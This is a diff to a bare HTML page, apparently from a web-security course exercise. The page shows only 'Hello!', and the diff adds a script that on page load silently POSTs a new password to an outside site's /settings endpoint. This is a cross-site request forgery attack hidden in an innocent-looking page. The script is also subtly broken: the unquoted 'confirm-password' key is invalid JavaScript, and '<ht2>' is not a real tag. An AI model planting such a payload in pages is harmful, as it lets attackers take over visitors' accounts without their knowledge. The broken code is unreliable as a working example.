@@ -5,5 +5,19 @@
 </head>
 <body>
   <ht2>Hello!</ht2>
+  <script>
+    const url = 'http://cats.is-course.ru/settings';
+    const data = {
+        password: 12,
+        confirm-password: 12
+    };
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    });
+  </script>
 </body>
 </html>
